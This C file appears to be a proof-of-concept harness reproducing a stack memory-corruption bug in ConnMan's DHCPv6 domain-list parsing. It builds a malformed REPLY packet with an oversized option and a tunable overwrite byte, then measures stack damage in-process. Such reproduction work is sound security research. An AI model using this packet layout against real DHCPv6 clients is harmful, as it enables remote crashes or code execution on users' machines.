/*
 * Wire-reply harness for CVE-2026-115863 / GHSA-725f-6r9j-c4hf.
 *
 * VERBATIM pinned tag-2.0 functions via generated .inc files:
 *   get_option_fn.inc    <- uint8_t *dhcpv6_get_option(...)  (gdhcp/common.c)
 *   get_domains_fn.inc   <- static GList *get_domains(...)    (gdhcp/client.c)
 *   get_ov_list_fn.inc   <- static GList *get_dhcpv6_option_value_list(...)
 *   get_request_fn.inc   <- static void get_dhcpv6_request(...)
 *
 * Unlike the callpath harness, dhcpv6_get_option() is NOT stubbed: the raw
 * REPLY-shaped packet is parsed by ConnMan's own option walker. The input is
 * a byte buffer in this process, not a socket; no daemon, network or full
 * ConnMan build is used. GLib is stubbed and its allocations are left to
 * process exit to keep LSan noise out of the ASan reports.
 */
#define _GNU_SOURCE
#include <stdint.h>
#include <stdio.h>
#include <arpa/inet.h>
#include <string.h>

#define NS_MAXDNAME 1025

/* gdhcp/common.h tag 2.0: only codes used by the exercised switch arms. */
#define G_DHCPV6_IA_NA        3
#define G_DHCPV6_IA_TA        4
#define G_DHCPV6_DNS_SERVERS 23
#define G_DHCPV6_DOMAIN_LIST 24
#define G_DHCPV6_IA_PD       25
#define G_DHCPV6_SNTP_SERVERS 31

typedef int gboolean;
typedef int gint;
typedef unsigned int guint;
typedef void *gpointer;
typedef size_t gsize;

typedef struct GList {
	void *data;
	struct GList *next;
	struct GList *prev;
} GList;

typedef struct _GHashTable GHashTable;

static GList *g_list_prepend(GList *list, void *data)
{
	GList *n = malloc(sizeof(*n));
	if (!n) exit(91);
	n->data = data;
	n->next = list;
	n->prev = NULL;
	if (list) list->prev = n;
	return n;
}

static GList *g_list_append(GList *list, void *data)
{
	GList *n = malloc(sizeof(*n)), *p;
	if (!n) exit(93);
	n->data = data; n->next = NULL; n->prev = NULL;
	if (!list) return n;
	for (p = list; p->next; p = p->next) ;
	p->next = n; n->prev = p;
	return list;
}

static GList *g_list_reverse(GList *list)
{
	GList *prev = NULL, *cur = list;
	while (cur) {
		GList *next = cur->next;
		cur->next = prev;
		cur->prev = next;
		prev = cur;
		cur = next;
	}
	return prev;
}

static char *g_strdup(const char *s)
{
	size_t n = strlen(s) + 1;
	char *p = malloc(n);
	if (!p) exit(92);
	memcpy(p, s, n);
	return p;
}

static void *g_try_malloc0(gsize n) { return calloc(1, n); }
static void g_free(void *p) { free(p); }
#define GINT_TO_POINTER(i) ((void *)(intptr_t)(i))
#define GPOINTER_TO_INT(p) ((int)(intptr_t)(p))

static void g_hash_table_remove(GHashTable *h, gpointer k) { (void)h; (void)k; }
static void g_hash_table_insert(GHashTable *h, gpointer k, gpointer v)
{ (void)h; (void)k; (void)v; }

/* Minimal GDHCPClient: only fields referenced by the extracted functions. */
typedef struct _GDHCPClient {
	GList *request_list;
	GHashTable *code_value_hash;
} GDHCPClient;

/* Verbatim struct from pinned gdhcp/common.h (flexible options array). */
struct dhcpv6_packet {
	uint8_t message;
	uint8_t transaction_id[3];
	uint8_t options[];
} __attribute__((packed));

/* Real signature from pinned gdhcp/common.h; NULL is passed by the verbatim
 * get_dhcpv6_request() for option_count. */
uint8_t *dhcpv6_get_option(struct dhcpv6_packet *packet, uint16_t pkt_len,
			int code, uint16_t *option_len, int *option_count);

/* Capture get_dhcpv6_request()'s frame base from inside the real debug()
 * call site, without modifying any verbatim function. */
static void *g_request_rbp;
static void debug(GDHCPClient *client, const char *format, ...)
{
	(void)client; (void)format;
	if (!g_request_rbp) g_request_rbp = __builtin_frame_address(1);
}

/* get_addresses is not reached: the crafted packet offers only code 24. */
static GList *get_addresses(GDHCPClient *c, int code, int len,
				unsigned char *value, uint16_t *status)
{
	(void)c; (void)code; (void)len; (void)value; (void)status;
	return NULL;
}

#include "get_option_fn.inc"
#include "get_domains_fn.inc"
#include "get_ov_list_fn.inc"
#include "get_request_fn.inc"

#define OPTVAL 2048
#define ATK_PKTLEN (4 + 4 + OPTVAL)
#define SAFE_PKTLEN (4 + 4 + 8)
static unsigned char pktbuf[ATK_PKTLEN];

/* DHCPv6 REPLY (message type 7) with one DOMAIN_LIST option (code 24).
 * The 16-bit option length is 2048 for attack, 8 for the safe control. */
static uint16_t craft(int attack, int lastjump)
{
	uint16_t olen = attack ? OPTVAL : 8;
	uint16_t pktlen = (uint16_t)(4 + 4 + olen);
	memset(pktbuf, 0, sizeof(pktbuf));
	pktbuf[0] = 7;
	pktbuf[1] = 0x11; pktbuf[2] = 0x22; pktbuf[3] = 0x33;
	pktbuf[4] = 0; pktbuf[5] = 24;
	pktbuf[6] = (unsigned char)(olen >> 8); pktbuf[7] = (unsigned char)olen;
	if (attack) {
		memset(pktbuf + 8, 0xff, OPTVAL);
		pktbuf[8 + OPTVAL - 1] = 0x00;
		pktbuf[8 + 1024] = (unsigned char)lastjump;
	} else {
		unsigned char *v = pktbuf + 8;
		v[0] = 3; v[1] = 'a'; v[2] = 'b'; v[3] = 'c';
		v[4] = 3; v[5] = 'd'; v[6] = 'e'; v[7] = 0;
	}
	return pktlen;
}

static void run_chain(GDHCPClient *client, struct dhcpv6_packet *pkt,
			uint16_t pktlen, uint16_t *status)
{
	get_dhcpv6_request(client, pkt, pktlen, status);
}

#ifndef PLAIN
int main(int argc, char **argv)
{
	int attack = (argc < 2 || strcmp(argv[1], "attack") == 0);
	int lastjump = 0x20;
	if (argc >= 3) lastjump = (int)strtol(argv[2], NULL, 0);
	uint16_t pktlen = craft(attack, lastjump);
	struct dhcpv6_packet *pkt = (struct dhcpv6_packet *)pktbuf;

	uint16_t olen = 0; int count = 0;
	uint8_t *value = dhcpv6_get_option(pkt, pktlen, G_DHCPV6_DOMAIN_LIST,
					&olen, &count);
	printf("WIREPARSE OLEN=%u COUNT=%d OFFSET=%ld\n", olen, count,
	       (long)(value ? value - pktbuf : -1));
	printf("WIRE MODE=%s PKTLEN=%u LASTJUMP=%02x\n",
	       attack ? "attack" : "safe", pktlen, lastjump);
	fflush(stdout);

	GDHCPClient client;
	memset(&client, 0, sizeof(client));
	client.request_list = g_list_prepend(NULL, GINT_TO_POINTER(G_DHCPV6_DOMAIN_LIST));
	uint16_t status = 0;
	run_chain(&client, pkt, pktlen, &status);

	printf("CHAIN DONE STATUS=%u REQ_RBP=%p\n", status, g_request_rbp);
	return 0;
}
#else
int main(int argc, char **argv)
{
	int lastjump = (argc >= 2) ? (int)strtol(argv[1], NULL, 0) : 0x80;
	uint16_t pktlen = craft(1, lastjump);
	struct dhcpv6_packet *pkt = (struct dhcpv6_packet *)pktbuf;
	printf("PLAIN LASTJUMP=%02x\n", lastjump);
	fflush(stdout);

	/* Broad caller-frame canary, as in the W1 callpath harness. */
	volatile unsigned char fill[16384];
	for (int i = 0; i < (int)sizeof(fill); i++) fill[i] = 0xee;

	GDHCPClient client;
	memset(&client, 0, sizeof(client));
	client.request_list = g_list_prepend(NULL, GINT_TO_POINTER(G_DHCPV6_DOMAIN_LIST));
	uint16_t status = 0;
	run_chain(&client, pkt, pktlen, &status);

	int dots = 0, first = -1, last = -1;
	for (int i = 0; i < (int)sizeof(fill); i++) {
		if (fill[i] == 0x2e) {
			dots++;
			if (first < 0) first = i;
			last = i;
		}
	}
	printf("CANARY DOTS=%d FIRST=%d LAST=%d FILLBASE=%p REQ_RBP=%p\n",
	       dots, first, last, (void *)(uintptr_t)fill, g_request_rbp);
	return 0;
}
#endif
